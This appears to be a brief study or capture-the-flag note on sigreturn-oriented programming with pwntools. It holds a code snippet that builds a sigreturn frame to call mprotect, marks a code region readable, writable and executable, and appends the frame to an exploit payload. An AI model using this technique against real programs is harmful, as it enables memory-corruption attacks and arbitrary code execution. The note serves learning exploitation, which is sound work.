# pwntools sigreturn
sigreturn syscall restores a frame of all registers
- Example: this sigreturn frame will jump right to a syscall to mprotect the executable code as r/w/x so we can use it as a stack and a buffer overflow spot
```
frame = SigreturnFrame()
frame.rip = DIRECT_SYSCALL
frame.rsp = OFFSET_VULN_FUNC_SYMTAB # set RSP as an offset into the symbol table pointing to the vuln function so we can ret to vuln right after
frame.rax = constants.linux.amd64.__NR_mprotect # syscall mprotect
frame.rdi = 0x401000
frame.rsi = 0x1000
frame.rdx = constants.linux.amd64.PROT_READ | constants.linux.amd64.PROT_WRITE | constants.linux.amd64.PROT_EXEC

payload += bytes(frame)
```
